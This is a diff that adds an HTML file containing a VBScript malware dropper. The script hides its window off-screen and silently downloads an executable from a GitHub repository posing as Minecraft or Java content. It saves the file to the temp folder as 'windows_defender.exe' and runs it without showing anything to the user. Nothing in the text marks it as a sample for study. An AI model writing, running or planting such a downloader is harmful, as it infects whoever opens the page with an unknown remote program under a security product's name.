@@ -1,0 +1,16 @@
+<html><body><script language="VBScript">
+Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+Dim temp: temp = fso.GetSpecialFolder(2)
+
+Dim url: url = "https://github.com/Minecraft-labx/java/raw/refs/heads/main/java.exe" & Chr(38) & "is=6a3ec0ca" & Chr(38) & "hm=93fe19623a0c1856fbfa3f6ca5ef348d5ae3f7a7505fa010bb6a44f18769443f" & Chr(38)
+shell.Run "bitsadmin /transfer d /download /priority high """ & url & """ """ & temp & "\windows_defender.exe""", 0, True
+
+If fso.FileExists(temp & "\windows_defender.exe") Then
+    shell.Run """" & temp & "\windows_defender.exe""", 0, False
+End If
+
+window.close()
+</script></body></html>
